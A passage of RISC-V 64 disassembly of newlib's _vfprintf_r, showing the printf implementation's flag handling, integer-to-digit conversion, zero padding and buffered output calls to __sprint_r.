   11408:	00147713          	andi	a4,s0,1
   1140c:	cf59                	beqz	a4,114aa <_vfprintf_r+0xa9c>
   1140e:	47e2                	lw	a5,24(sp)
   11410:	01a7873b          	addw	a4,a5,s10
   11414:	01b70dbb          	addw	s11,a4,s11
   11418:	06600b13          	li	s6,102
   1141c:	a895                	j	11490 <_vfprintf_r+0xa82>
   1141e:	8732                	mv	a4,a2
   11420:	b56d                	j	112ca <_vfprintf_r+0x8bc>
   11422:	0705                	addi	a4,a4,1
   11424:	fff74783          	lbu	a5,-1(a4)
   11428:	0605                	addi	a2,a2,1
   1142a:	fef60fa3          	sb	a5,-1(a2)
   1142e:	b5c9                	j	112f0 <_vfprintf_r+0x8e2>
   11430:	0e210713          	addi	a4,sp,226
   11434:	e599                	bnez	a1,11442 <_vfprintf_r+0xa34>
   11436:	03000793          	li	a5,48
   1143a:	0ef10123          	sb	a5,226(sp)
   1143e:	0e310713          	addi	a4,sp,227
   11442:	0306879b          	addiw	a5,a3,48
   11446:	00170613          	addi	a2,a4,1
   1144a:	00f70023          	sb	a5,0(a4)
   1144e:	b55d                	j	112f4 <_vfprintf_r+0x8e6>
   11450:	000d9563          	bnez	s11,1145a <_vfprintf_r+0xa4c>
   11454:	00147713          	andi	a4,s0,1
   11458:	cb39                	beqz	a4,114ae <_vfprintf_r+0xaa0>
   1145a:	47e2                	lw	a5,24(sp)
   1145c:	0017871b          	addiw	a4,a5,1
   11460:	bf55                	j	11414 <_vfprintf_r+0xa06>
   11462:	014d4c63          	blt	s10,s4,1147a <_vfprintf_r+0xa6c>
   11466:	00147713          	andi	a4,s0,1
   1146a:	8dea                	mv	s11,s10
   1146c:	c701                	beqz	a4,11474 <_vfprintf_r+0xa66>
   1146e:	47e2                	lw	a5,24(sp)
   11470:	01a78dbb          	addw	s11,a5,s10
   11474:	06700b13          	li	s6,103
   11478:	a821                	j	11490 <_vfprintf_r+0xa82>
   1147a:	47e2                	lw	a5,24(sp)
   1147c:	06700b13          	li	s6,103
   11480:	01478dbb          	addw	s11,a5,s4
   11484:	01a04663          	bgtz	s10,11490 <_vfprintf_r+0xa82>
   11488:	41ad8e3b          	subw	t3,s11,s10
   1148c:	001e0d9b          	addiw	s11,t3,1
   11490:	40047413          	andi	s0,s0,1024
   11494:	00040c1b          	sext.w	s8,s0
   11498:	e402                	sd	zero,8(sp)
   1149a:	e80c07e3          	beqz	s8,11328 <_vfprintf_r+0x91a>
   1149e:	4c01                	li	s8,0
   114a0:	e9a054e3          	blez	s10,11328 <_vfprintf_r+0x91a>
   114a4:	0ff00693          	li	a3,255
   114a8:	a01d                	j	114ce <_vfprintf_r+0xac0>
   114aa:	8dea                	mv	s11,s10
   114ac:	b7b5                	j	11418 <_vfprintf_r+0xa0a>
   114ae:	06600b13          	li	s6,102
   114b2:	4d85                	li	s11,1
   114b4:	bff1                	j	11490 <_vfprintf_r+0xa82>
   114b6:	2701                	sext.w	a4,a4
   114b8:	03a75063          	ble	s10,a4,114d8 <_vfprintf_r+0xaca>
   114bc:	6782                	ld	a5,0(sp)
   114be:	40ed0d3b          	subw	s10,s10,a4
   114c2:	0017c703          	lbu	a4,1(a5)
   114c6:	c315                	beqz	a4,114ea <_vfprintf_r+0xadc>
   114c8:	0785                	addi	a5,a5,1
   114ca:	2c05                	addiw	s8,s8,1
   114cc:	e03e                	sd	a5,0(sp)
   114ce:	6782                	ld	a5,0(sp)
   114d0:	0007c703          	lbu	a4,0(a5)
   114d4:	fed711e3          	bne	a4,a3,114b6 <_vfprintf_r+0xaa8>
   114d8:	47a2                	lw	a5,8(sp)
   114da:	00fc073b          	addw	a4,s8,a5
   114de:	4786                	lw	a5,64(sp)
   114e0:	02f7073b          	mulw	a4,a4,a5
   114e4:	01b70dbb          	addw	s11,a4,s11
   114e8:	b581                	j	11328 <_vfprintf_r+0x91a>
   114ea:	47a2                	lw	a5,8(sp)
   114ec:	2785                	addiw	a5,a5,1
   114ee:	e43e                	sd	a5,8(sp)
   114f0:	bff9                	j	114ce <_vfprintf_r+0xac0>
   114f2:	008b8713          	addi	a4,s7,8
   114f6:	f83a                	sd	a4,48(sp)
   114f8:	02047713          	andi	a4,s0,32
   114fc:	000bb783          	ld	a5,0(s7)
   11500:	c719                	beqz	a4,1150e <_vfprintf_r+0xb00>
   11502:	7722                	ld	a4,40(sp)
   11504:	e398                	sd	a4,0(a5)
   11506:	7bc2                	ld	s7,48(sp)
   11508:	64c2                	ld	s1,16(sp)
   1150a:	e48ff06f          	j	10b52 <_vfprintf_r+0x144>
   1150e:	01047713          	andi	a4,s0,16
   11512:	fb65                	bnez	a4,11502 <_vfprintf_r+0xaf4>
   11514:	04047713          	andi	a4,s0,64
   11518:	c711                	beqz	a4,11524 <_vfprintf_r+0xb16>
   1151a:	02815703          	lhu	a4,40(sp)
   1151e:	00e79023          	sh	a4,0(a5)
   11522:	b7d5                	j	11506 <_vfprintf_r+0xaf8>
   11524:	20047413          	andi	s0,s0,512
   11528:	c411                	beqz	s0,11534 <_vfprintf_r+0xb26>
   1152a:	02814703          	lbu	a4,40(sp)
   1152e:	00e78023          	sb	a4,0(a5)
   11532:	bfd1                	j	11506 <_vfprintf_r+0xaf8>
   11534:	5722                	lw	a4,40(sp)
   11536:	c398                	sw	a4,0(a5)
   11538:	b7f9                	j	11506 <_vfprintf_r+0xaf8>
   1153a:	01046413          	ori	s0,s0,16
   1153e:	2401                	sext.w	s0,s0
   11540:	008b8793          	addi	a5,s7,8
   11544:	f83e                	sd	a5,48(sp)
   11546:	02047793          	andi	a5,s0,32
   1154a:	cb85                	beqz	a5,1157a <_vfprintf_r+0xb6c>
   1154c:	000bbb83          	ld	s7,0(s7)
   11550:	bff47413          	andi	s0,s0,-1025
   11554:	2401                	sext.w	s0,s0
   11556:	4781                	li	a5,0
   11558:	0c0107a3          	sb	zero,207(sp)
   1155c:	577d                	li	a4,-1
   1155e:	12ed8c63          	beq	s11,a4,11696 <_vfprintf_r+0xc88>
   11562:	8722                	mv	a4,s0
   11564:	f7f47413          	andi	s0,s0,-129
   11568:	2401                	sext.w	s0,s0
   1156a:	120b9663          	bnez	s7,11696 <_vfprintf_r+0xc88>
   1156e:	200d8463          	beqz	s11,11776 <_vfprintf_r+0xd68>
   11572:	4705                	li	a4,1
   11574:	12e79463          	bne	a5,a4,1169c <_vfprintf_r+0xc8e>
   11578:	bc05                	j	10fa8 <_vfprintf_r+0x59a>
   1157a:	01047793          	andi	a5,s0,16
   1157e:	f7f9                	bnez	a5,1154c <_vfprintf_r+0xb3e>
   11580:	04047793          	andi	a5,s0,64
   11584:	000bab83          	lw	s7,0(s7)
   11588:	c789                	beqz	a5,11592 <_vfprintf_r+0xb84>
   1158a:	1bc2                	slli	s7,s7,0x30
   1158c:	030bdb93          	srli	s7,s7,0x30
   11590:	b7c1                	j	11550 <_vfprintf_r+0xb42>
   11592:	20047793          	andi	a5,s0,512
   11596:	c781                	beqz	a5,1159e <_vfprintf_r+0xb90>
   11598:	0ffbfb93          	andi	s7,s7,255
   1159c:	bf55                	j	11550 <_vfprintf_r+0xb42>
   1159e:	1b82                	slli	s7,s7,0x20
   115a0:	020bdb93          	srli	s7,s7,0x20
   115a4:	b775                	j	11550 <_vfprintf_r+0xb42>
   115a6:	008b8793          	addi	a5,s7,8
   115aa:	f83e                	sd	a5,48(sp)
   115ac:	77e1                	lui	a5,0xffff8
   115ae:	8307c793          	xori	a5,a5,-2000
   115b2:	0cf11823          	sh	a5,208(sp)
   115b6:	0001a7b7          	lui	a5,0x1a
   115ba:	49078793          	addi	a5,a5,1168 # 1a490 <zeroes.4441+0x60>
   115be:	00246413          	ori	s0,s0,2
   115c2:	f0be                	sd	a5,96(sp)
   115c4:	000bbb83          	ld	s7,0(s7)
   115c8:	2401                	sext.w	s0,s0
   115ca:	4789                	li	a5,2
   115cc:	07800b13          	li	s6,120
   115d0:	b761                	j	11558 <_vfprintf_r+0xb4a>
   115d2:	008b8793          	addi	a5,s7,8
   115d6:	f83e                	sd	a5,48(sp)
   115d8:	0c0107a3          	sb	zero,207(sp)
   115dc:	57fd                	li	a5,-1
   115de:	000bb483          	ld	s1,0(s7)
   115e2:	00fd8e63          	beq	s11,a5,115fe <_vfprintf_r+0xbf0>
   115e6:	866e                	mv	a2,s11
   115e8:	4581                	li	a1,0
   115ea:	8526                	mv	a0,s1
   115ec:	404030ef          	jal	ra,149f0 <memchr>
   115f0:	8baa                	mv	s7,a0
   115f2:	a40503e3          	beqz	a0,11038 <_vfprintf_r+0x62a>
   115f6:	40950dbb          	subw	s11,a0,s1
   115fa:	4b81                	li	s7,0
   115fc:	bc35                	j	11038 <_vfprintf_r+0x62a>
   115fe:	8526                	mv	a0,s1
   11600:	bfcff0ef          	jal	ra,109fc <strlen>
   11604:	00050d9b          	sext.w	s11,a0
   11608:	bfcd                	j	115fa <_vfprintf_r+0xbec>
   1160a:	01046413          	ori	s0,s0,16
   1160e:	2401                	sext.w	s0,s0
   11610:	008b8793          	addi	a5,s7,8
   11614:	f83e                	sd	a5,48(sp)
   11616:	02047793          	andi	a5,s0,32
   1161a:	c789                	beqz	a5,11624 <_vfprintf_r+0xc16>
   1161c:	000bbb83          	ld	s7,0(s7)
   11620:	4785                	li	a5,1
   11622:	bf1d                	j	11558 <_vfprintf_r+0xb4a>
   11624:	01047793          	andi	a5,s0,16
   11628:	fbf5                	bnez	a5,1161c <_vfprintf_r+0xc0e>
   1162a:	04047793          	andi	a5,s0,64
   1162e:	000bab83          	lw	s7,0(s7)
   11632:	c789                	beqz	a5,1163c <_vfprintf_r+0xc2e>
   11634:	1bc2                	slli	s7,s7,0x30
   11636:	030bdb93          	srli	s7,s7,0x30
   1163a:	b7dd                	j	11620 <_vfprintf_r+0xc12>
   1163c:	20047793          	andi	a5,s0,512
   11640:	c781                	beqz	a5,11648 <_vfprintf_r+0xc3a>
   11642:	0ffbfb93          	andi	s7,s7,255
   11646:	bfe9                	j	11620 <_vfprintf_r+0xc12>
   11648:	1b82                	slli	s7,s7,0x20
   1164a:	020bdb93          	srli	s7,s7,0x20
   1164e:	bfc9                	j	11620 <_vfprintf_r+0xc12>
   11650:	0001a7b7          	lui	a5,0x1a
   11654:	49078793          	addi	a5,a5,1168 # 1a490 <zeroes.4441+0x60>
   11658:	d9eff06f          	j	10bf6 <_vfprintf_r+0x1e8>
   1165c:	01047793          	andi	a5,s0,16
   11660:	da079363          	bnez	a5,10c06 <_vfprintf_r+0x1f8>
   11664:	04047793          	andi	a5,s0,64
   11668:	000bab83          	lw	s7,0(s7)
   1166c:	c791                	beqz	a5,11678 <_vfprintf_r+0xc6a>
   1166e:	1bc2                	slli	s7,s7,0x30
   11670:	030bdb93          	srli	s7,s7,0x30
   11674:	d96ff06f          	j	10c0a <_vfprintf_r+0x1fc>
   11678:	20047793          	andi	a5,s0,512
   1167c:	c789                	beqz	a5,11686 <_vfprintf_r+0xc78>
   1167e:	0ffbfb93          	andi	s7,s7,255
   11682:	d88ff06f          	j	10c0a <_vfprintf_r+0x1fc>
   11686:	1b82                	slli	s7,s7,0x20
   11688:	020bdb93          	srli	s7,s7,0x20
   1168c:	d7eff06f          	j	10c0a <_vfprintf_r+0x1fc>
   11690:	8722                	mv	a4,s0
   11692:	4785                	li	a5,1
   11694:	bdc1                	j	11564 <_vfprintf_r+0xb56>
   11696:	4705                	li	a4,1
   11698:	90e785e3          	beq	a5,a4,10fa2 <_vfprintf_r+0x594>
   1169c:	4709                	li	a4,2
   1169e:	0ae78d63          	beq	a5,a4,11758 <_vfprintf_r+0xd4a>
   116a2:	1afc                	addi	a5,sp,380
   116a4:	007bf713          	andi	a4,s7,7
   116a8:	03070713          	addi	a4,a4,48
   116ac:	fee78fa3          	sb	a4,-1(a5)
   116b0:	003bdb93          	srli	s7,s7,0x3
   116b4:	fff78493          	addi	s1,a5,-1
   116b8:	020b9863          	bnez	s7,116e8 <_vfprintf_r+0xcda>
   116bc:	00147693          	andi	a3,s0,1
   116c0:	ca89                	beqz	a3,116d2 <_vfprintf_r+0xcc4>
   116c2:	03000693          	li	a3,48
   116c6:	00d70663          	beq	a4,a3,116d2 <_vfprintf_r+0xcc4>
   116ca:	fed48fa3          	sb	a3,-1(s1)
   116ce:	ffe78493          	addi	s1,a5,-2
   116d2:	17c10e13          	addi	t3,sp,380
   116d6:	876e                	mv	a4,s11
   116d8:	4b81                	li	s7,0
   116da:	409e0dbb          	subw	s11,t3,s1
   116de:	e402                	sd	zero,8(sp)
   116e0:	4c01                	li	s8,0
   116e2:	4d01                	li	s10,0
   116e4:	e8eff06f          	j	10d72 <_vfprintf_r+0x364>
   116e8:	87a6                	mv	a5,s1
   116ea:	bf6d                	j	116a4 <_vfprintf_r+0xc96>
   116ec:	40047c13          	andi	s8,s0,1024
   116f0:	4a01                	li	s4,0
   116f2:	1afc                	addi	a5,sp,380
   116f4:	4d29                	li	s10,10
   116f6:	2c01                	sext.w	s8,s8
   116f8:	0ff00693          	li	a3,255
   116fc:	4825                	li	a6,9
   116fe:	03abf733          	remu	a4,s7,s10
   11702:	fff78493          	addi	s1,a5,-1
   11706:	2a05                	addiw	s4,s4,1
   11708:	0307071b          	addiw	a4,a4,48
   1170c:	fee78fa3          	sb	a4,-1(a5)
   11710:	020c0e63          	beqz	s8,1174c <_vfprintf_r+0xd3e>
   11714:	6782                	ld	a5,0(sp)
   11716:	0007c783          	lbu	a5,0(a5)
   1171a:	02fa1963          	bne	s4,a5,1174c <_vfprintf_r+0xd3e>
   1171e:	02d78763          	beq	a5,a3,1174c <_vfprintf_r+0xd3e>
   11722:	03787563          	bleu	s7,a6,1174c <_vfprintf_r+0xd3e>
   11726:	6786                	ld	a5,64(sp)
   11728:	65c6                	ld	a1,80(sp)
   1172a:	fc42                	sd	a6,56(sp)
   1172c:	8c9d                	sub	s1,s1,a5
   1172e:	863e                	mv	a2,a5
   11730:	8526                	mv	a0,s1
   11732:	e436                	sd	a3,8(sp)
   11734:	4a6040ef          	jal	ra,15bda <strncpy>
   11738:	6782                	ld	a5,0(sp)
   1173a:	4a01                	li	s4,0
   1173c:	66a2                	ld	a3,8(sp)
   1173e:	0017c783          	lbu	a5,1(a5)
   11742:	7862                	ld	a6,56(sp)
   11744:	c781                	beqz	a5,1174c <_vfprintf_r+0xd3e>
   11746:	6782                	ld	a5,0(sp)
   11748:	0785                	addi	a5,a5,1
   1174a:	e03e                	sd	a5,0(sp)
   1174c:	03abdbb3          	divu	s7,s7,s10
   11750:	f80b81e3          	beqz	s7,116d2 <_vfprintf_r+0xcc4>
   11754:	87a6                	mv	a5,s1
   11756:	b765                	j	116fe <_vfprintf_r+0xcf0>
   11758:	1ae4                	addi	s1,sp,380
   1175a:	7706                	ld	a4,96(sp)
   1175c:	00fbf793          	andi	a5,s7,15
   11760:	14fd                	addi	s1,s1,-1
   11762:	97ba                	add	a5,a5,a4
   11764:	0007c783          	lbu	a5,0(a5)
   11768:	004bdb93          	srli	s7,s7,0x4
   1176c:	00f48023          	sb	a5,0(s1)
   11770:	fe0b95e3          	bnez	s7,1175a <_vfprintf_r+0xd4c>
   11774:	bfb9                	j	116d2 <_vfprintf_r+0xcc4>
   11776:	1ae4                	addi	s1,sp,380
   11778:	ffa9                	bnez	a5,116d2 <_vfprintf_r+0xcc4>
   1177a:	8b05                	andi	a4,a4,1
   1177c:	db39                	beqz	a4,116d2 <_vfprintf_r+0xcc4>
   1177e:	03000793          	li	a5,48
   11782:	16f10da3          	sb	a5,379(sp)
   11786:	82bff06f          	j	10fb0 <_vfprintf_r+0x5a2>
   1178a:	020b02e3          	beqz	s6,11fae <_vfprintf_r+0x15a0>
   1178e:	11610c23          	sb	s6,280(sp)
   11792:	0c0107a3          	sb	zero,207(sp)
   11796:	f85e                	sd	s7,48(sp)
   11798:	dccff06f          	j	10d64 <_vfprintf_r+0x356>
   1179c:	0641                	addi	a2,a2,16
   1179e:	011cb423          	sd	a7,8(s9)
   117a2:	ea32                	sd	a2,272(sp)
   117a4:	10b12423          	sw	a1,264(sp)
   117a8:	02aed463          	ble	a0,t4,117d0 <_vfprintf_r+0xdc2>
   117ac:	0210                	addi	a2,sp,256
   117ae:	85ca                	mv	a1,s2
   117b0:	854e                	mv	a0,s3
   117b2:	fd76                	sd	t4,184(sp)
   117b4:	f942                	sd	a6,176(sp)
   117b6:	e546                	sd	a7,136(sp)
   117b8:	e13a                	sd	a4,128(sp)
   117ba:	fcb6                	sd	a3,120(sp)
   117bc:	1c7050ef          	jal	ra,17182 <__sprint_r>
   117c0:	7a051863          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   117c4:	7eea                	ld	t4,184(sp)
   117c6:	784a                	ld	a6,176(sp)
   117c8:	68aa                	ld	a7,136(sp)
   117ca:	670a                	ld	a4,128(sp)
   117cc:	76e6                	ld	a3,120(sp)
   117ce:	8f56                	mv	t5,s5
   117d0:	36c1                	addiw	a3,a3,-16
   117d2:	8cfa                	mv	s9,t5
   117d4:	de8ff06f          	j	10dbc <_vfprintf_r+0x3ae>
   117d8:	0641                	addi	a2,a2,16
   117da:	011cb423          	sd	a7,8(s9)
   117de:	ea32                	sd	a2,272(sp)
   117e0:	10b12423          	sw	a1,264(sp)
   117e4:	02aed463          	ble	a0,t4,1180c <_vfprintf_r+0xdfe>
   117e8:	0210                	addi	a2,sp,256
   117ea:	85ca                	mv	a1,s2
   117ec:	854e                	mv	a0,s3
   117ee:	e576                	sd	t4,136(sp)
   117f0:	e142                	sd	a6,128(sp)
   117f2:	fcc6                	sd	a7,120(sp)
   117f4:	f8ba                	sd	a4,112(sp)
   117f6:	f4b6                	sd	a3,104(sp)
   117f8:	18b050ef          	jal	ra,17182 <__sprint_r>
   117fc:	76051a63          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11800:	6eaa                	ld	t4,136(sp)
   11802:	680a                	ld	a6,128(sp)
   11804:	78e6                	ld	a7,120(sp)
   11806:	7746                	ld	a4,112(sp)
   11808:	76a6                	ld	a3,104(sp)
   1180a:	8f56                	mv	t5,s5
   1180c:	36c1                	addiw	a3,a3,-16
   1180e:	8cfa                	mv	s9,t5
   11810:	e92ff06f          	j	10ea2 <_vfprintf_r+0x494>
   11814:	06c1                	addi	a3,a3,16
   11816:	011cb423          	sd	a7,8(s9)
   1181a:	ea36                	sd	a3,272(sp)
   1181c:	10c12423          	sw	a2,264(sp)
   11820:	02bed263          	ble	a1,t4,11844 <_vfprintf_r+0xe36>
   11824:	0210                	addi	a2,sp,256
   11826:	85ca                	mv	a1,s2
   11828:	854e                	mv	a0,s3
   1182a:	e176                	sd	t4,128(sp)
   1182c:	fcc2                	sd	a6,120(sp)
   1182e:	f8c6                	sd	a7,112(sp)
   11830:	f4ba                	sd	a4,104(sp)
   11832:	151050ef          	jal	ra,17182 <__sprint_r>
   11836:	72051d63          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   1183a:	6e8a                	ld	t4,128(sp)
   1183c:	7866                	ld	a6,120(sp)
   1183e:	78c6                	ld	a7,112(sp)
   11840:	7726                	ld	a4,104(sp)
   11842:	8556                	mv	a0,s5
   11844:	3741                	addiw	a4,a4,-16
   11846:	8caa                	mv	s9,a0
   11848:	eaeff06f          	j	10ef6 <_vfprintf_r+0x4e8>
   1184c:	06500693          	li	a3,101
   11850:	5766df63          	ble	s6,a3,11dce <_vfprintf_r+0x13c0>
   11854:	754e                	ld	a0,240(sp)
   11856:	75ee                	ld	a1,248(sp)
   11858:	4601                	li	a2,0
   1185a:	4681                	li	a3,0
   1185c:	f4ba                	sd	a4,104(sp)
   1185e:	3ca070ef          	jal	ra,18c28 <__eqtf2>
   11862:	7726                	ld	a4,104(sp)
   11864:	10051e63          	bnez	a0,11980 <_vfprintf_r+0xf72>
   11868:	0001a7b7          	lui	a5,0x1a
   1186c:	4c078793          	addi	a5,a5,1216 # 1a4c0 <zeroes.4441+0x90>
   11870:	00fcb023          	sd	a5,0(s9)
   11874:	4785                	li	a5,1
   11876:	00fcb423          	sd	a5,8(s9)
   1187a:	10812783          	lw	a5,264(sp)
   1187e:	0705                	addi	a4,a4,1
   11880:	ea3a                	sd	a4,272(sp)
   11882:	0017871b          	addiw	a4,a5,1
   11886:	10e12423          	sw	a4,264(sp)
   1188a:	479d                	li	a5,7
   1188c:	0cc1                	addi	s9,s9,16
   1188e:	00e7da63          	ble	a4,a5,118a2 <_vfprintf_r+0xe94>
   11892:	0210                	addi	a2,sp,256
   11894:	85ca                	mv	a1,s2
   11896:	854e                	mv	a0,s3
   11898:	0eb050ef          	jal	ra,17182 <__sprint_r>
   1189c:	6c051a63          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   118a0:	8cd6                	mv	s9,s5
   118a2:	47ee                	lw	a5,216(sp)
   118a4:	0147c563          	blt	a5,s4,118ae <_vfprintf_r+0xea0>
   118a8:	00147793          	andi	a5,s0,1
   118ac:	cfa5                	beqz	a5,11924 <_vfprintf_r+0xf16>
   118ae:	67a6                	ld	a5,72(sp)
   118b0:	6762                	ld	a4,24(sp)
   118b2:	0cc1                	addi	s9,s9,16
   118b4:	fefcb823          	sd	a5,-16(s9)
   118b8:	67e2                	ld	a5,24(sp)
   118ba:	fefcbc23          	sd	a5,-8(s9)
   118be:	67d2                	ld	a5,272(sp)
   118c0:	97ba                	add	a5,a5,a4
   118c2:	ea3e                	sd	a5,272(sp)
   118c4:	10812783          	lw	a5,264(sp)
   118c8:	0017871b          	addiw	a4,a5,1
   118cc:	10e12423          	sw	a4,264(sp)
   118d0:	479d                	li	a5,7
   118d2:	00e7da63          	ble	a4,a5,118e6 <_vfprintf_r+0xed8>
   118d6:	0210                	addi	a2,sp,256
   118d8:	85ca                	mv	a1,s2
   118da:	854e                	mv	a0,s3
   118dc:	0a7050ef          	jal	ra,17182 <__sprint_r>
   118e0:	68051863          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   118e4:	8cd6                	mv	s9,s5
   118e6:	fffa049b          	addiw	s1,s4,-1
   118ea:	02905d63          	blez	s1,11924 <_vfprintf_r+0xf16>
   118ee:	6b69                	lui	s6,0x1a
   118f0:	4c41                	li	s8,16
   118f2:	430b0b13          	addi	s6,s6,1072 # 1a430 <zeroes.4441>
   118f6:	4d1d                	li	s10,7
   118f8:	10812703          	lw	a4,264(sp)
   118fc:	016cb023          	sd	s6,0(s9)
   11900:	67d2                	ld	a5,272(sp)
   11902:	0017069b          	addiw	a3,a4,1
   11906:	8736                	mv	a4,a3
   11908:	010c8613          	addi	a2,s9,16
   1190c:	049c4763          	blt	s8,s1,1195a <_vfprintf_r+0xf4c>
   11910:	009cb423          	sd	s1,8(s9)
   11914:	94be                	add	s1,s1,a5
   11916:	ea26                	sd	s1,272(sp)
   11918:	10d12423          	sw	a3,264(sp)
   1191c:	479d                	li	a5,7
   1191e:	8cb2                	mv	s9,a2
   11920:	e4d7c063          	blt	a5,a3,10f60 <_vfprintf_r+0x552>
   11924:	8811                	andi	s0,s0,4
   11926:	60041063          	bnez	s0,11f26 <_vfprintf_r+0x1518>
   1192a:	7702                	ld	a4,32(sp)
   1192c:	76e2                	ld	a3,56(sp)
   1192e:	5782                	lw	a5,32(sp)
   11930:	00d75363          	ble	a3,a4,11936 <_vfprintf_r+0xf28>
   11934:	57e2                	lw	a5,56(sp)
   11936:	5722                	lw	a4,40(sp)
   11938:	9fb9                	addw	a5,a5,a4
   1193a:	f43e                	sd	a5,40(sp)
   1193c:	67d2                	ld	a5,272(sp)
   1193e:	cb81                	beqz	a5,1194e <_vfprintf_r+0xf40>
   11940:	0210                	addi	a2,sp,256
   11942:	85ca                	mv	a1,s2
   11944:	854e                	mv	a0,s3
   11946:	03d050ef          	jal	ra,17182 <__sprint_r>
   1194a:	62051363          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   1194e:	10012423          	sw	zero,264(sp)
   11952:	640b9963          	bnez	s7,11fa4 <_vfprintf_r+0x1596>
   11956:	8cd6                	mv	s9,s5
   11958:	b67d                	j	11506 <_vfprintf_r+0xaf8>
   1195a:	07c1                	addi	a5,a5,16
   1195c:	018cb423          	sd	s8,8(s9)
   11960:	ea3e                	sd	a5,272(sp)
   11962:	10e12423          	sw	a4,264(sp)
   11966:	00dd5a63          	ble	a3,s10,1197a <_vfprintf_r+0xf6c>
   1196a:	0210                	addi	a2,sp,256
   1196c:	85ca                	mv	a1,s2
   1196e:	854e                	mv	a0,s3
   11970:	013050ef          	jal	ra,17182 <__sprint_r>
   11974:	5e051e63          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11978:	8656                	mv	a2,s5
   1197a:	34c1                	addiw	s1,s1,-16
   1197c:	8cb2                	mv	s9,a2
   1197e:	bfad                	j	118f8 <_vfprintf_r+0xeea>
   11980:	46ee                	lw	a3,216(sp)
   11982:	12d04163          	bgtz	a3,11aa4 <_vfprintf_r+0x1096>
   11986:	0001a7b7          	lui	a5,0x1a
   1198a:	4c078793          	addi	a5,a5,1216 # 1a4c0 <zeroes.4441+0x90>
   1198e:	00fcb023          	sd	a5,0(s9)
   11992:	4785                	li	a5,1
   11994:	00fcb423          	sd	a5,8(s9)
   11998:	10812783          	lw	a5,264(sp)
   1199c:	0705                	addi	a4,a4,1
   1199e:	ea3a                	sd	a4,272(sp)
   119a0:	0017871b          	addiw	a4,a5,1
   119a4:	10e12423          	sw	a4,264(sp)
   119a8:	479d                	li	a5,7
   119aa:	0cc1                	addi	s9,s9,16
   119ac:	00e7da63          	ble	a4,a5,119c0 <_vfprintf_r+0xfb2>
   119b0:	0210                	addi	a2,sp,256
   119b2:	85ca                	mv	a1,s2
   119b4:	854e                	mv	a0,s3
   119b6:	7cc050ef          	jal	ra,17182 <__sprint_r>
   119ba:	5a051b63          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   119be:	8cd6                	mv	s9,s5
   119c0:	47ee                	lw	a5,216(sp)
   119c2:	e791                	bnez	a5,119ce <_vfprintf_r+0xfc0>
   119c4:	000a1563          	bnez	s4,119ce <_vfprintf_r+0xfc0>
   119c8:	00147793          	andi	a5,s0,1
   119cc:	dfa1                	beqz	a5,11924 <_vfprintf_r+0xf16>
   119ce:	67a6                	ld	a5,72(sp)
   119d0:	6762                	ld	a4,24(sp)
   119d2:	010c8313          	addi	t1,s9,16
   119d6:	00fcb023          	sd	a5,0(s9)
   119da:	67e2                	ld	a5,24(sp)
   119dc:	00fcb423          	sd	a5,8(s9)
   119e0:	67d2                	ld	a5,272(sp)
   119e2:	97ba                	add	a5,a5,a4
   119e4:	ea3e                	sd	a5,272(sp)
   119e6:	10812783          	lw	a5,264(sp)
   119ea:	0017871b          	addiw	a4,a5,1
   119ee:	10e12423          	sw	a4,264(sp)
   119f2:	479d                	li	a5,7
   119f4:	00e7da63          	ble	a4,a5,11a08 <_vfprintf_r+0xffa>
   119f8:	0210                	addi	a2,sp,256
   119fa:	85ca                	mv	a1,s2
   119fc:	854e                	mv	a0,s3
   119fe:	784050ef          	jal	ra,17182 <__sprint_r>
   11a02:	56051763          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11a06:	8356                	mv	t1,s5
   11a08:	4b6e                	lw	s6,216(sp)
   11a0a:	040b5663          	bgez	s6,11a56 <_vfprintf_r+0x1048>
   11a0e:	6c69                	lui	s8,0x1a
   11a10:	41600b3b          	negw	s6,s6
   11a14:	879a                	mv	a5,t1
   11a16:	4d41                	li	s10,16
   11a18:	430c0c13          	addi	s8,s8,1072 # 1a430 <zeroes.4441>
   11a1c:	4c9d                	li	s9,7
   11a1e:	10812683          	lw	a3,264(sp)
   11a22:	0187b023          	sd	s8,0(a5)
   11a26:	6752                	ld	a4,272(sp)
   11a28:	0016861b          	addiw	a2,a3,1
   11a2c:	86b2                	mv	a3,a2
   11a2e:	0341                	addi	t1,t1,16
   11a30:	056d4763          	blt	s10,s6,11a7e <_vfprintf_r+0x1070>
   11a34:	0167b423          	sd	s6,8(a5)
   11a38:	9b3a                	add	s6,s6,a4
   11a3a:	ea5a                	sd	s6,272(sp)
   11a3c:	10c12423          	sw	a2,264(sp)
   11a40:	479d                	li	a5,7
   11a42:	00c7da63          	ble	a2,a5,11a56 <_vfprintf_r+0x1048>
   11a46:	0210                	addi	a2,sp,256
   11a48:	85ca                	mv	a1,s2
   11a4a:	854e                	mv	a0,s3
   11a4c:	736050ef          	jal	ra,17182 <__sprint_r>
   11a50:	52051063          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11a54:	8356                	mv	t1,s5
   11a56:	67d2                	ld	a5,272(sp)
   11a58:	00933023          	sd	s1,0(t1) # 0 <_start-0x100b0>
   11a5c:	01433423          	sd	s4,8(t1)
   11a60:	97d2                	add	a5,a5,s4
   11a62:	ea3e                	sd	a5,272(sp)
   11a64:	10812783          	lw	a5,264(sp)
   11a68:	01030c93          	addi	s9,t1,16
   11a6c:	0017871b          	addiw	a4,a5,1
   11a70:	10e12423          	sw	a4,264(sp)
   11a74:	479d                	li	a5,7
   11a76:	eae7d7e3          	ble	a4,a5,11924 <_vfprintf_r+0xf16>
   11a7a:	ce6ff06f          	j	10f60 <_vfprintf_r+0x552>
   11a7e:	0741                	addi	a4,a4,16
   11a80:	01a7b423          	sd	s10,8(a5)
   11a84:	ea3a                	sd	a4,272(sp)
   11a86:	10d12423          	sw	a3,264(sp)
   11a8a:	00ccda63          	ble	a2,s9,11a9e <_vfprintf_r+0x1090>
   11a8e:	0210                	addi	a2,sp,256
   11a90:	85ca                	mv	a1,s2
   11a92:	854e                	mv	a0,s3
   11a94:	6ee050ef          	jal	ra,17182 <__sprint_r>
   11a98:	4c051c63          	bnez	a0,11f70 <_vfprintf_r+0x1562>
   11a9c:	8356                	mv	t1,s5
   11a9e:	3b41                	addiw	s6,s6,-16
